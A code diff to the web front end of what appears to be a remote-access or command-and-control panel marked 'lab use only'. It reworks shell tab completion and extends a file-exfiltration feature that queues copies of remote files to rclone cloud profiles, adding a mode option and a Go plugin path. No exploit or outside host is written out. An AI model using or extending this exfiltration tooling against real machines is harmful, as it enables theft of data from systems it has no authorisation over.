@@ -1575,12 +1575,6 @@ function getShellCompletionCandidates(line) {
     add(cmd);
   }
 
-  cands.sort((a, b) => {
-    const aHist = history.includes(a);
-    const bHist = history.includes(b);
-    if (aHist !== bHist) return aHist ? -1 : 1;
-    return a.localeCompare(b, undefined, { sensitivity: "base" });
-  });
   return cands;
 }
 
@@ -1589,20 +1583,20 @@ function applyShellTabCompletion(shift) {
   if (!input || input.disabled || state.viewMode === "history") return;
   const line = input.value;
   let cands = getShellCompletionCandidates(line);
-  if (!cands.length) return;
-
   const cycle = state.shellTabCycle;
-  if (cycle.anchor !== line) {
+  const continuingCycle =
+    cycle.anchor !== null &&
+    (cycle.candidates.includes(line) || line === longestCommonPrefix(cycle.candidates, cycle.anchor));
+  if (cycle.anchor === null || (!continuingCycle && cycle.anchor !== line)) {
+    if (!cands.length) return;
     cycle.anchor = line;
     cycle.candidates = cands;
     cycle.index = -1;
-  } else {
-    cands = cycle.candidates;
   }
+  cands = cycle.candidates;
 
   if (cands.length === 1) {
     input.value = cands[0];
-    cycle.anchor = cands[0];
     cycle.index = 0;
     updateShellCompletionHint();
     return;
@@ -1611,7 +1605,6 @@ function applyShellTabCompletion(shift) {
   const lcp = longestCommonPrefix(cands, line);
   if (cycle.index < 0 && lcp.length > line.length) {
     input.value = lcp;
-    cycle.anchor = lcp;
     updateShellCompletionHint();
     return;
   }
@@ -1621,7 +1614,6 @@ function applyShellTabCompletion(shift) {
   if (next >= cands.length) next = 0;
   cycle.index = next;
   input.value = cands[next];
-  cycle.anchor = cands[next];
   updateShellCompletionHint();
 }
 
@@ -2207,13 +2199,13 @@ async function postDownloadQueue(remote) {
   return true;
 }
 
-async function postExfilQueue(remote, profile) {
+async function postExfilQueue(remote, profile, mode = "auto") {
   const { status, data } = await api(
     `/sessions/${encodeURIComponent(state.selectedId)}/exfil`,
     {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ remote_path: remote, profile }),
+      body: JSON.stringify({ remote_path: remote, profile, mode }),
     }
   );
   if (status !== 200) {
@@ -2426,9 +2418,9 @@ function populateExfilProfiles(data) {
   const profiles = data?.profiles || [];
   const defaultName = data?.default_profile || "";
   state.rcloneDefaultProfile = defaultName;
-  const ready = Boolean(data?.rclone_binary) && profiles.length > 0 && !data?.load_error;
+  const ready = Boolean(data?.rclone_binary || data?.rclone_plugin) && profiles.length > 0 && !data?.load_error;
 
-  if (!data?.rclone_binary) {
+  if (!data?.rclone_binary && !data?.rclone_plugin) {
     select.disabled = true;
     const opt = document.createElement("option");
     opt.value = "";
@@ -2486,11 +2478,6 @@ async function refreshExfilStatus() {
     hint.textContent = `rclone profile error: ${data.load_error}`;
     return;
   }
-  if (!data.rclone_binary) {
-    hint.textContent =
-      "rclone.exe missing on server — place binary in tools/rclone/ (see docs/rclone-exfil.md)";
-    return;
-  }
   const count = (data.profiles || []).length;
   const maxBytes = Number(data.max_bytes);
   const limit =
@@ -2500,23 +2487,27 @@ async function refreshExfilStatus() {
       "No rclone profiles — set RMM_RCLONE_PROFILES or RMM_RCLONE_PROFILES_FILE on the server";
     return;
   }
-  hint.textContent = `rclone ready · ${count} profile${count === 1 ? "" : "s"} · ${limit} · default ${data.default_profile || "—"} (lab use only)`;
+  const paths = [];
+  if (data.rclone_plugin) paths.push("Go plugin");
+  if (data.rclone_binary) paths.push("binary fallback");
+  hint.textContent = `${paths.join(" + ")} ready · ${count} profile${count === 1 ? "" : "s"} · ${limit} · default ${data.default_profile || "—"} (lab use only)`;
 }
 
 async function queueExfil() {
   const remote = $("#exfil-remote").value.trim();
   const profileSelect = $("#exfil-profile");
   const profile = profileSelect && !profileSelect.disabled ? profileSelect.value.trim() : "";
+  const mode = $("#exfil-mode")?.value || "auto";
   if (!remote || !state.selectedId || !profile) return;
-  appendShellEcho(`exfil ${remote} ${profile}`, {
+  appendShellEcho(`exfil ${remote} ${profile} [${mode}]`, {
     block: true,
     kind: "exfil",
     remotePath: remote,
-    meta: `(exfil queued via ${profile})`,
+    meta: `(exfil queued via ${profile}, mode ${mode})`,
     matchKeys: [`exfil ${remote} ${profile}`, `exfil ${remote}`, `exfil ${remote} --profile ${profile}`],
   });
   $("#exfil-remote").value = "";
-  await postExfilQueue(remote, profile);
+  await postExfilQueue(remote, profile, mode);
 }
 
 async function queueScreenshot() {
